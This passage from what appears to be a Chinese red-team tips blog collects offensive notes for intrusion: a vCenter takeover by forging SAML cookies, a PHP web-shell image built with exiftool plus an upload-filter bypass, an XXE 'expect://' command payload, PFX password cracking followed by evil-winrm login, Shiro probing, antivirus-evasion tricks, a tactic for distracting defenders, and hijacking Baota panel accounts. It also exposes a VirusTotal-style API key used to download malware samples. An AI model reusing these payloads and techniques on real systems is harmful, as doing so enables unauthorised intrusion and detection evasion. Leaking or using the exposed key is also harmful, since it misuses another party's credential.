class="hljs-name">C</span>:\ProgramData\VMware\vCenterServer\data\perfcharts\tc-instance\webapps\statsreport\<br></code></pre></td></tr></table></figure><p>接下来就是一气呵成了，大文件下载data.mdb,使用工具伪造COOKIE，然后登陆vSphere Client即可接管这个内网环境。</p><p>然后用这个脚本直接攻击即可：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/horizon3ai/</span>vcenter_saml_login<span class="hljs-regexp">/blob/m</span>ain/vcenter_saml_login.py<br><span class="hljs-regexp">/使用脚本时可能会报错，需要提前安装requirements.txt下的库/</span><br><span class="hljs-regexp">/pip install python_ldap-3.4.0-cp310-cp310-win_amd64.whl/</span><br>想使用这个脚本，必须要可达vSphere Client，也就是说用它之前得先把socks代理搞好，搞好之后就可以愉快的食用这个脚本了<br>使用方法为：<br>python vcenter_saml_login.py -t &lt;目标机器内网ip&gt; -p data.mdb<br></code></pre></td></tr></table></figure><p>更多参考链接:<a href="https://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247485272&idx=1&sn=7db93fcc3013033566de9448e1dd9de4&chksm=fcdf5b47cba8d251087e893bfda200779502cdba40f8336a17d36972e0f1f5cd0e98ac50293a&scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&amp;mid=2247485272&amp;idx=1&amp;sn=7db93fcc3013033566de9448e1dd9de4&amp;chksm=fcdf5b47cba8d251087e893bfda200779502cdba40f8336a17d36972e0f1f5cd0e98ac50293a&amp;scene=21#wechat_redirect</a></p><p>虽然被黑的很惨，这里还是更正一下，除了 ch1ng 师傅在 <a href="https://www.ch1ng.com/blog/264.html">https://www.ch1ng.com/blog/264.html</a> 提到的 Tomcat 处理会忽略 \ 的情况，刚才园长提到的是 org.apache.tomcat.util.http.parser.HttpParser#unquote 方法会处理文件名中的 “，方法是见到双引号后直接字符串长度 -1<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205271632760.png" alt="image-20220527163259558"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205271633349.png" alt="image-20220527163313249"></p><p>配合 \ 的忽略可以搞出比较恶心的文件名</p><p>vpn设备集合：路由功能、流量审计、防火墙、vpn</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">ftp加! 可以执行命令<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202206012249266.jpeg" alt="图片">！！！可恶啊我现在才知道 hw都结束了</p><p>vps提供下载的话 还是用apache好 别开python http 网站访问没问题</p><p>但是curl等命令行下载不容易成功</p><p>Kili工具:<strong>使用exiftool -Comment&#x3D;’<?php system($_REQUEST['cmd']); ?>‘ 1.png 生成一个图片马，图片在网上下一个.png格式的。</strong></p><p><strong>直接上传.png格式是无法上传成功的，将其改成1.php.png格式。再次进行上传。</strong></p><p>VCenter获得锁屏机器Hash之KonBoot引导：</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&mid=2247490788&idx=1&sn=0bf64b4ad055e08984ed52f726e617aa&chksm=eaad9cd9ddda15cf53fd72a7950b2004900a7d37c3c3eb870bc3e7974a18174d05dccef3d316&mpshare=1&scene=23&srcid=0616IuAwJhpU2vlrufTdIiDW&sharer_sharetime=1655394036259&sharer_shareid=9108c08c45d1f36cab8f5c866e004fa3#rd">https://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&amp;mid=2247490788&amp;idx=1&amp;sn=0bf64b4ad055e08984ed52f726e617aa&amp;chksm=eaad9cd9ddda15cf53fd72a7950b2004900a7d37c3c3eb870bc3e7974a18174d05dccef3d316&amp;mpshare=1&amp;scene=23&amp;srcid=0616IuAwJhpU2vlrufTdIiDW&amp;sharer_sharetime=1655394036259&amp;sharer_shareid=9108c08c45d1f36cab8f5c866e004fa3#rd</a></p><p>可以用john爆破压缩包密码</p><p>pfx是个经过数字签名加密的证书文件</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">文件的扩展名PFX的系统文件，以嵌入到它的加密安全功能特别文件。这些的加密安全功能的<span class="hljs-string">.pfx</span>文件包括用来参与确定身份验证过程数字证书的用户或设备都可以访问某些文件，系统本身或者计算机连接的是那些具有管理员权限的网络是否。这些PFX文件需要密码就可以使用Adobe Acrobat X或Adobe Reader中打开之前。这意味着这些PFX文件是保护或保护用户免受黑客，第三方用户的计算机和网络，而无需访问系统和网络资源的同意有益的以及恶意应用程序，指示它来访问这些受保护的资源和数据的代码。PFX文件可能在Mac和Microsoft Windows系统中找到，并且可用于打开这些应用程序的<span class="hljs-string">.pfx</span>文件是使用Adobe Acrobat X和Adobe Reader与Mac或Microsoft Windows环境兼容的版本。<br></code></pre></td></tr></table></figure><p>同样可以用jhon爆破</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">john --wordlist=<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt pfxhash<br></code></pre></td></tr></table></figure><p>然后使用<code>openssl</code>和pkcs12，将key导出。</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">openssl pkcs12 -<span class="hljs-keyword">in</span> legacyy_dev_auth.pfx -nocerts -<span class="hljs-keyword">out</span> pfx.<span class="hljs-keyword">key</span><br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202206171428502.png" alt="图片">密码都是一样，上面爆破出来那个</p><p>之后还必须要生成一个证书才能登录</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">openssl pkcs12 -<span class="hljs-keyword">in</span> legacyy_dev_auth.pfx -clcerts -nokeys -<span class="hljs-keyword">out</span> pfx.crt<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202206171428300.png" alt="图片">密码都一样</p><p>前面信息收集说到发现有winrm，端口5986</p><p>使用<code>evil-winrm</code>工具进行连接</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">evil-winrm -<span class="hljs-selector-tag">i</span> ip -S -c pfx<span class="hljs-selector-class">.crt</span> -k pfx<span class="hljs-selector-class">.key</span> -<span class="hljs-selector-tag">p</span> -u<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202206171429692.png" alt="图片">输入我们刚刚的密码</p><p>就能登录</p><p>JNI (<code>Java Native Interface</code>，JAVA 本地接口) 允许 Java 代码和其它编程语言编写的代码进行交互，主要为Java和Native层（C&#x2F;C++）相互调用的接口规范，但是并不妨碍扩展其他语言。 JNI 在 Java1.1 中正式推出，在 Java1.2 中加入了<code>JNI_OnLoad</code>和<code>JNI_OnUnload</code>方法。</p><p>Weblogic写shell的路径大概如下&#x2F;u01&#x2F;domains&#x2F;osb&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;uddiexplorer&#x2F;随机字符&#x2F;war&#x2F;shell.jsp</p><p>hash传递rap 使用win10登录出现身份验证错误 要求的函数不受支持 “这可能是由于CredSSP加密数据库修正” 解决链接:<a href="https://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247506207&idx=1&sn=e15fa2431e43dd964c2bc516e7b3cb64&chksm=ec1c8c20db6b05363307efcc0130476a8fcde3715beee218252c549e6e55ecb5a7626002c459&mpshare=1&scene=23&srcid=062417jP0IV782r2EUewn3Xu&sharer_sharetime=1656049936513&sharer_shareid=ee83a55e0b955b99e8343acbb61916b7#rd">实战 | 记一次简单的国外站点小练手 (qq.com)</a></p><p>使用DNSURL来探测其他利用链</p><p>对于shiro，使用成熟的exp工具来自动回显利用的情况已经越来越少。大部分情况下，即使找到key也无法找到合适的利用方式和正确的利用版本（工具生成序列化字符串时使用的依赖版本与服务器上运行的依赖版本不符就会产生报错，无法反序列化）。</p><p>但是由于DNSURL链是基于jar包且不受版本影响的，所以遇到shiro的出网的站时，可以用这个工具（<a href="https://github.com/kezibei/Urldns%EF%BC%89%E7%94%9F%E6%88%90%E5%88%A9%E7%94%A8%E9%93%BE%E6%8E%A2%E6%B5%8Bpayload%EF%BC%8C%E5%AE%9E%E6%93%8D%E5%A6%82%E4%B8%8B%EF%BC%9A">https://github.com/kezibei/Urldns）生成利用链探测payload，实操如下：</a></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202206251213913.png" alt="图片">注意此时生成的是base64编码的值，shiro验证和利用还需要自己写脚本进行aes或者gcm的加密。使用Burp输入cookie字段发包后可以得知为Windows服务器，存在c3p0-92版本和cc31版本依赖（但不是一定就可以利用)。<a href="https://mp.weixin.qq.com/s/TSD_bcL5JBMJQBotCHqTyw">https://mp.weixin.qq.com/s/TSD_bcL5JBMJQBotCHqTyw</a></p><p>把请求包详情展示，包括发送包，因为有时候复现不出来，大概率是和请求头某些参数有关系。</p><p>xml传输的标志<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202207061204449.png" alt="image-20220706120455116"></p><p>容易造成xxe攻击，且一般情况下，只能造成任意文件读取。除非对方开启了expct：&#x2F;&#x2F;-处理交互式的流。当然这个封装协议默认是不开启的。就能造成rce</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;expect://id&quot;</span> &gt;</span>]&gt;<br></code></pre></td></tr></table></figure><p>单向流就是我发给你，然后要看到你接收</p><p>双向流就是在单向流的基础上你一条我一条来回</p><p>隧道就是互发信息直到读取不出来</p><p>客户端就是我(客户端)发给你就行。你之后再看到也没关系</p><p>声东击西:在进行内网横向的时候 我们可以布置多台机器去对外部资产或者必须要运行的资产进行疯狂扫描骚扰。导致运维(蓝队)烦不胜烦,进而掩盖我们的真正攻击</p><p>msf植入jdk包钓鱼</p><p>McAfee检测到压缩包病毒直接删 根本不给你机会看到</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">注意是只删里面的特定文件<br></code></pre></td></tr></table></figure><p>火绒一般只查杀C:&#x2F;system&#x2F;里面的文件 把它复制到其它地方就行</p><p>20220811</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">Virustotal的key 用来下载他们的文件<br><br>上干货——Enigmasoftware api key：<br>d10468bead05da1685629a0abcfed5f963d6adbc7e6bb2b2fc343dbb36be0349<br><br><br>下载文件（比如下载哈希为fc6c880e33a73faf58a30f862d18dcc2的文件）<br>https://www.virustotal.com/intelligence/download/?apikey=d10468bead05da1685629a0abcfed5f963d6adbc7e6bb2b2fc343dbb36be0349&amp;<span class="hljs-built_in">hash</span>=fc6c880e33a73faf58a30f862d18dcc2<br>高级查询<br>curl --request GET --url <span class="hljs-string">&quot;https://www.virustotal.com/api/v3/intelligence/search?query=&#123;name:thor64&#125;&quot;</span> --header <span class="hljs-string">&quot;x-apikey:d10468bead05da1685629a0abcfed5f963d6adbc7e6bb2b2fc343dbb36be0349&quot;</span><br>其他的API使用手册地址：<br>https://developers.virustotal.com/reference/overview<br></code></pre></td></tr></table></figure><p>sql中根据系统视图联合查询包含phone字段的列名、数据量大于阈值、表名、schema、数据库名，并按数据量排序。</p><p>mssql</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">SELECT t.TABLE_SCHEMA as <span class="hljs-string">&#x27;TABLE_SCHEMA&#x27;</span>,a.name as <span class="hljs-string">&#x27;TABLE_NAME&#x27;</span>, c.COLUMN_NAME, b.rows FROM sysobjects AS a<br>INNER JOIN sysindexes AS b ON a.id = b.id<br>INNER JOIN information_schema.columns c on a.name = c.TABLE_NAME<br>INNER JOIN information_schema.tables t on a.name = t.TABLE_NAME<br>WHERE (a.type = <span class="hljs-string">&#x27;u&#x27;</span>) AND (b.indid IN (<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)) and (c.COLUMN_NAME like <span class="hljs-string">&#x27;%phone%&#x27;</span>) and (b.rows &gt; <span class="hljs-number">100</span>)<br>ORDER BY b.rows DESC<br></code></pre></td></tr></table></figure><p>mysql</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">SELECT t.table_schema AS <span class="hljs-string">&#x27;schema&#x27;</span>, t.table_name AS <span class="hljs-string">&#x27;table&#x27;</span>, c.COLUMN_NAME AS <span class="hljs-string">&#x27;column&#x27;</span>, t.table_rows AS <span class="hljs-string">&#x27;rows&#x27;</span><br>FROM information_schema.TABLES t<br>left join information_schema.COLUMNS c on c.table_name = t.table_name<br>WHERE c.COLUMN_NAME like <span class="hljs-string">&#x27;%phone%&#x27;</span> and t.table_rows &gt; <span class="hljs-number">100</span><br>group by t.table_schema, t.table_name, c.COLUMN_NAME, t.table_rows order by t.table_rows desc<br></code></pre></td></tr></table></figure><p>oracle</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">select s.username <span class="hljs-string">&quot;schema&quot;</span>,t.table_name <span class="hljs-string">&quot;table&quot;</span>,c.column_name <span class="hljs-string">&quot;column_name&quot;</span>,t.num_rows <span class="hljs-string">&quot;num_rows&quot;</span> from sys.dba_users s <br>right join sys.dba_tables t on s.username=t.owner <br>right join all_tab_columns c on c.table_name=t.table_name <br>where t.num_rows &gt; <span class="hljs-number">100</span> and c.column_name like <span class="hljs-string">&#x27;%PHONE%&#x27;</span> <br>group by s.username,t.table_name,c.column_name,t.num_rows order by <span class="hljs-number">4</span> desc<br></code></pre></td></tr></table></figure><p>postgres</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">SELECT c.table_schema,c.table_name,c.column_name,t.n_live_tup FROM pg_stat_user_tables as t<br>inner join information_schema.columns as c <br>on c.table_name = t.relname<br>where c.column_name like <span class="hljs-string">&#x27;%PHONE%&#x27;</span> and t.n_live_tup &gt;<span class="hljs-number">100</span> <br>ORDER BY t.n_live_tup DESC<br></code></pre></td></tr></table></figure><p>白+黑的主要手段：</p><p>白嫖怪为了得到一个可以以签名程序运行自己任意代码的条件就会去挖掘一些软件厂商的程序是否存在DLL劫持漏洞，利用DLL劫持的特性达到披着羊皮的狼的目的</p><p>动态库.so后缀 静态库.a后缀</p><p>每一个计划任务文件都存放于<code>%SystemRoot%\System32\Tasks</code>目录下，内容和导出的XML完全相同。</p><p>你的签名验证、UAC验证、token验证、打印机、远程桌面都是COM实现的 这个uuid就是罪恶的源泉  有多少个UUID COM就实现了多少个组件 然后效果是终端设备没办法监控到COM的行为 只能人肉解码</p><p>c++和c#用vc6.0或者vs2008来写</p><p>宝塔的话，先把宝塔原本db文件下载下来备份一下，再添加一个账号密码进去登陆就好了，操作完成后，再将原db文件覆盖过去就行。</p><p>能看到宝塔db说明很高权限，复制db到可读可写目录，下载下来，搜索admin，一般都能解开</p><p>静态免杀 动态不免杀 看父进程权限</p><p>CLR(公共语言运行库)(并且再github上有源码)-.NET框架的代码核心,可以通过获取CLR进而获取很多内置甚至隐藏的函数来进行隐蔽运行</p><p>com本身是一种开发理念，旨在跨应用和语言共享二进制代码，其理念类似dll，但dll仅能被C&#x2F;C++理解或遵循C调用规范的语言使用,com通过指明二进制模块必须编译成约定的结构解决了这个问题，其实现方式与c++的类相似，所以通常使用c++来实现一个com组件。</p><p>就windows中实现来看，com组件本身仍旧是标准的pe结构(dll&#x2F;exe)，只不过其内部包含了coclass，以及在注册表中注册了相关键值，以便我们找到并使用它。</p>]]></content>
    
    
    <categories>
      
      <category>红队    tips</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tips</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hooksleep 绕wdf</title>
    <link href="/%E5%88%A9%E7%94%A8hook%E7%BB%95%E8%BF%87windowsdefender%E5%8A%A8%E6%80%81%E6%9F%A5%E6%9D%80.html"/>
    <url>/%E5%88%A9%E7%94%A8hook%E7%BB%95%E8%BF%87windowsdefender%E5%8A%A8%E6%80%81%E6%9F%A5%E6%9D%80.html</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="7b6d2e9a41b4b82a94585fd029a16d7308badc53d0ed3c755ee640fc0572ec29">7d86b79689ab60361a9356d67b6bbcd5607fed1144eeaf16c8ef05b84114e7f7f98e6b2112f80897fd8552a66bf70cb98669ce9d40eaa8126afa83ce8a1694a5bed9ace7a7640d186a98f81eeaad37335a48ac8afd053808936de2ed4de677a4be45fee4f1a046132a692646eb24e4b40b037d2115592a8157b0c3d118d805ac4d94a975918974157cfd9d7cfd4bebcfe0e782c3f97a1568e747d7ca63b3f76a56ba669e1dc75771ef5566bf779b4810546b9dd69f69690e5335f3b9ad6654076d7d9cbfb0eee8130e0aa8dff0d1bf598ff5f59d88498b306747cf0e4930f1ac5a8b827d377e4c2fac77ac539bac59564e6211b813364025d836cb4a2e1a9036c4f92445aa907cbe567c73aade6d2718420d71493b0bc12e78550c0d366f87e50af0436a42e5c49e9d0fb08a78ebcf34be14bb167e08f18f501b8979e95f6bb4fedae47eef1e15ef39c2869ea59c6b52efe5d2659fd7e322aba1858113aa7284471e08ceff8fb5dc90141d318cf4581c8cab38f142173c1de6baea567ee32727e2f932287459b71a34b3be1fbf4558f058c767f919247388bac5961965750be3c79e8afcef899cac08693f1ac8b762d695bb87468287e1717a7c6a93090fe038643e82c1574ac296bfcd757849cc908a5d22eb88b8796be6085786bff744fa1fb22db858b47a382f7abeed15c30621703442e783f5f04871b90ab6763aed460bf0a1d1818e3e5cb0b53106b57d3cb3fe1fbe0e3436df87612db76f7f2fba4c4cffcb6bd5699f334c8109eba7710ebd394f7d8aae54b95e133c442e1ee364cc48751e08ffb5e5ac0531ec2fcc572bc3b414fb53a5bc1fa404b17cb8a75ba8494a319be14d6646202953963d39b74e139101b72b0495073cf26eda80fe77210ac1e242a2102cfce78ed75aa20b5c18af2ec110828450d3f168fcfc985b858319a038b471ef39fcf69af10fe03c4409a88770fb815a075687e2f536854cc7f340f549bbb2c5644f83d1c4b0f4477affdebc0a14d1c0a2db625c920c8ddb4775ae783a7271a6eeed03998667dc85dc159e0ab3326dd2592de227b22e62f2a79593fdeae32ca8306982b0a4581a56eaa99899655de7d7e86a6054f3284815c891ad286b02e1672c526bd1c14ea2bce57cadc07671854dafb6c5c0b4d1e10c4f62a030d8e7fa67ce171b3241a360df31266253c0822b58571712ae96fc8ef64a8b32bf6917fe96dec839b2895019e5a28521b6eb66ab2c6dde53034c5f4bdfd7ac4bf0bafe2ec6ffb40cddfe8368895d6afb3b2edbbbc34d733dca4e73731968aecaa8b10d22c5048675e24454cc88feffe028021f06551c8eac983c8daffa124da5f33f0e949977bbcdc779684b03e782b4ea40e9a61836a84036147e2e9e0ff36b91937bfcf88186d97ccceaec000e5bc18cc20fbccb595afe3b7018404285e6b38f67c68a66f438528990588dc624df7aef8560b1d38f689d8452a8c9c7ca289b0d261a94e19beec54eb11317934c3f786fe3a968fa29e5b2d132130a962d88c7e4dfdce745a09d4e50c8f50d4c73cff8a408fc588158fc1ce34e2bab06b5aacd5db726db9154f61541c15d6597ae7d66f237797fd59f0248bfb1f4141db7c26d91a5439930a7015e74256b23ed010d7a78ff195fd15619e3bef401f9626fef89c98da045d24899e93bc5fc529a88da1c80b63c464b5cb686705ebcc9ab758bb9abd79a6974dcf4ec8c8f2864a3ff200263ca57405a96c5c037105a8ada5afacf85d19940264735fb1c4a83a95fb6ea06d17a4480c9d098ba044e9cdcd0ae8b88e32d3ac6c58d66fe5e3b0d9caa1e9c652983228c4bc318d7f49f6b74c9518dbc1b9858f12d9d048d331550460be95d012079e347337798d4fb64d8e1b3a5585db8bf86de6035697f777beed4d1e55b2f08e1bbcfe98ed1d9d8ac4f6d501fa4c090ebc664f78d13292f0bb87ba5757106e85fa3ce1fa57783c682926a2b40538ce7b99ea19088775062856f4ebdd5168e4a6492a5ba9074e58a82c67053f3541343ddd71a36c67f2b404f65e493e8f6cc144efcfb4c945ffb9e31f42858e0ef5fb71a82ff04557029ad132427acf38fdccc444f7a25d3a54631ad8e26ae7bdd42309c55def7b85c6b32a4cf5749166778b24f95459f622e4ae89713900d665d42e5cc728d467caaeea8431cc2f0318d3a324b34b765dd9ce7885a8de8ea4cd7885057c2b06cf7b19aa4c69538afb1f9fdea892c0ac568bd8429e55e843814f7ac547bb0f3335ae8e045485d63f1ca1113ff1b36273e2c04959cffd2d0b1830709f83565fc304464d8e8eb6d41de9766a92d6d1133225af66bf65a0e9b160ac14ab12d137b2721288be76dbbcdb61d962f70b83069c4a14ba1767156e09c3ec79a8e6b8884ed58729e10312fb67f35721b5ed88092c7775fb9e1c4eed730bf3d648149cc2c6f7374ec0170372a3610255e83ccfb69a1aecccafcafe5643a968195dbd3f6c8b2733edc567fd284f7d1d3a51876af4bc0c831544738f4904771cc0406c87f9c7c773ba386559052db1b74cc7fb33f61ee935e12b1d8fff6b7c2761cfad0cc35f64425c9e97814bf0c6efc7345609cb08fb3cc3b8a4d2e93ae6376665caecc254f87f0b7446fab86566cce7d61117a04be18ae885ca45e2b1352a009c623de44bffb4bfe1a77d6d601bab2678fe0fbd9e9309cf93c536cf3ef9ab4277005724867f08a3bc0482563f3c40827319992e0896443eafb8169365479c4247877edc5a194c227267a5424be82345c56ec792e1f7170df63e1de81c40954768b7d839b9f8ada0584819e303f273863cbc49aeca5a6b8f65896c50d70465f2bcb605f26f27c61018dca7af9b1bb86676768d65d75790c8dfe23c07d789a0614e32c8ab54401ed16e2a441f48d718d978f0f8931465b3ee5f5be744494e68772814ab487d3fee691d2b7e416485173cdb980d9e5d6da8086bc98b33cab2c95ad44ca11c0046ece38c06639362cda3b7b5a445b573b4f0a27234423bd53d6632ea17942dc8cb24e68c7fddf68ec9f38f15ff2aa8a555338c1bc0e478dbe3b742673905c658910685402d7e70b5f3bc19fb183f18a0cc2280da2b2c1c96328559841a52ff3b85392537a53dcc2009ad16ed1a35a77a27b39c4f639ea258444a7ddf01f5e8ec2f09e6c2e2e2f6214cf9f0b7000e061d2dd96cdc8a59efa1b6c0351182048e0f3827235d47271836fe2769a7260181d92209d6c5e74a0a259e401608441df40929dac58e1c9813ac6fbfe5e71a824b69ca6971fc6fa4cafe376feb0a1e249773590183d32b03c94af4728ff89241ddd655a1cfe53ef68144237212823c1f89652e1a3d0dd6a186186e6274dfe670e8201df3a17d5a425792e1ae755cfe77021b06972e5764600ada45a5a603d8d8d9765bbec521622d6fa6fc49a62e81e9c3ee40ee46002cf06e1d6832967108e01a4ceefa179dcf1645dae1651c15cc2776fb9cffa8474ea3a817aed65f347058dbdd9abdd06c65ea665d0cba09626bb289bdd6ed58cf0b35e88c366c9a8e7eaebeec2c03c9c2e11ab0fb87c7d58c7e574d9aa083333c2b251f63bb243bc4c3b17c49ce80515c38ec67f5cc7539e48b1ae09158dd58e6af785dfecc87261fccb0d60b0ba8d1d4379c6a309140eecc09df9b3898d8fe1047b4ecf6304654abafa72ed679c838574b6946e5981b74600e8402093baa0f8601b641652fa8c294586ca66e28a341c16527e30c702cd134453f60a1637cfc7ae99efc84019ab044d6c691d8198b7ee4375b0da48fb9759b29adcef90a784b5ceb9c5c41672cf1671efd6a4e99ca54fae1aa83fe64efbc8da3a993c8d9b5509b73b19c70f35a08c58c0e8253f8968f286bea90cd2f5456a0088fda1d738cb52316d4962ec7c50f09553ceca62c955c4b3ada5f5cac080fd9d0f610e92e1ac8d7161695dbfc6f443374265d84dba682e70c508179f9089f7b4d776aac3d62fb5985afd20b447ba7cedaafbc504b2e9646a3ab6a5a01fa219d8b70cb3248c57ad2f0f01840698cad13cdf842171a04049dfce07ce3daa5ce5e024de04fca9ee7d350e94f397fb93211497e93560e8cfb09caee1cb1750889371e156448049300dd5c3220a085ada06aa07b3538950ae86ca07300dcc14925a9383240bac7c703c7f7bc28daa2d72666c0d5d89a01ded412ef4d321f3696ccf84f49790bfbbaf484062a8f2ed2bef371f841e9b6ac79d7e750d630b419e5c8c18a919cbaf38410f6f8469343f14ca27f15f042563cba0ca6f9c13c1d4d84a541d66f65cb9a6d328097308e14359627478dc8dc5aeff2d7f143eada1befde255287454c0380a6e96cd55f7b536d220cfea47aedd3ca0a2b2cb5159d515cd65be71f7cae9edb3453865b7006af7b778aaacd8f68d12ea4bb0a9956a9295f4510189e2f10e865621dc8a3f67ea535e5df2c331d5b44822c40926b60ac99ee0629f5993615821c3d438d272054e959295bb7c65f99804d9f1542e6c3f0bc1d69aa477f691b0c8b162b7cfa933c9d9b1f52a90289a253d47ac459623b6d566823c024d6e694fbf1bd028239552c0f707055c9dd39f78ed5f9e0367ef2307b297afeec690c6d94b14bbb6f7cb770e0960923f22203cff4aca984176697589a90d9964d0be50874978351c1f7c68dfe9db3c03debc0b0a6adc451696aeeb7eb35609b029406f32544c51e901656cf13bfd3a15752fa6c1bb8157a424c51f8e28f8e1c1842a033ef4e0bfc0c3301edf1fa030774bd17f4634ecef3903f082bdaa8394940021c6e9f653aac4cac7dde10fb39487676b5f27c1a1de14f5637d3550551455fb987a5b7bd7353c94abb864e9eb3e9ab3a17ccda4e407431361e4d7daf387755e65bfea776459cf445191cc45d6c830a069d56ef4c4d4ac32a83a0c3277a3ac6308c164be7e24d119ba867f382ba0d056cdbeed2e5e7b427f3831cb419dc3519529a008aad19a4562008265f83e29f4183c28a68fd638cb7556cbf06acf545e81fcc11148aa91b1b3e41b2f7d4f4993aebce40a861985968d3f404b5afe1f362019d0c739dd39906d32dfbcc8b1613c2bdc05542c9507955efdb8fb9bd3a5c18f9e9b51e85c6e61245bf19329d221a491c1fdfa894e0fbee8cba0a6071abf260fb873423e28f868c833430620112110ba143c735e97931f27a38d299348734a6659cba96d5c43b4d34dabd84e3a1ad2f4edc204d7e642ec8a34631c94b9827e5ffca95a98069bb3bea5c70b07e9c91f8e24d731fb71d0136dcf181949808025a68580bed3850b55fb48426a58d67e0a5dfb97934f19bb2984c28e33a91ca4d7c083fe9ed6ba61e90b32876a92468ee2ff1ff4f4436373a535ff4c9e9388aff1579b330eec04cee18c2c979a1a2538bad4a509b46aa246bfde1df6f1fc5486d95c157d20def8eca06aa3f1f4a32266826d267320c9853b152abb90a999eb7a7683b8472c354225fc677b32e26ddb93dcb5f439366ae7f1d3e95bdff2706bfb1cc57b6b6d892c08debb7710497a7cf8b12c2e9c7190bb068a9d7fc0ecc96e638e6eb209b4dffe8ba0736b2d25bca8aa334fb32773ed11d07f58a8e0667b2e54538e984d6776d1ffa6134ce04f93f8a2142be5ac30c12e4fdfae92e798cc8ff6f844bf8f62272e3cb2054538fdde272b608e0472818c790325a20e9965455057b8d4acfe0c6aa91d49160d1e60b79cf3721c57b5efa1b4664ef67e238673f6191e74519af6446313cbd235ef99d1bd6958d474d005247d06cdf06ed348479cad6add793c648cda9e3f77f1c47ad6717fd22a70c3ce1b3b9dfde68e2436e205b77dcba1d75b4c12c4cb3272d5da703a9179b9f602cd222dbefb032969bb6dc9fc10410f30ec7fe6b18692aa5a123ba880325e0aa4ea4ee5ae62b3d4dc1f0452aa1223f7157f12e613e77c5a18e0a91499f25f7afaa2f9d5033eb9dd649ee3f9b2d1557812d2a116df5ba002b9aa61024b8f04b19d9338f0f76efb8e3b4cc8794a1475ea34993ca467b36178999781f6129009c845710aa7b01e9b07ac82aade122c527699283a21d7a08bcec45b476d1a92ea6e745045f8162226487993fb7d1967f7219bbca673188ec74e1dd1b4d5bf2773217ac90b3f5651f2629086b556da8b92d6e9e789124389f836fdc944985163d48182be7a3e7b68567e7eedca7df9420006f21cf7d2b9f74109c080daecc13126d97ec30f1817edee6344681e360257afe9741ec0af8e1ccbf50fe7134c3af29fd5f86431b817c334f5e08174120371d98d68b6f42aef161105a90a72138b321bb9249c30a75dcd7b5249c2d4c4270e255b7de45990e36f1e3813537be7e1bd0793c138265f20c71b79b108bb8f0c70fd9ba1179a858c6e0bd54edc93719c096fcb553da3b31b26588740b8ef4e68b0943e6d124f135d312fea37b1755d4247e3d2193b62beb1e39cbcf5c8df5b858a2376925431c118965c347c1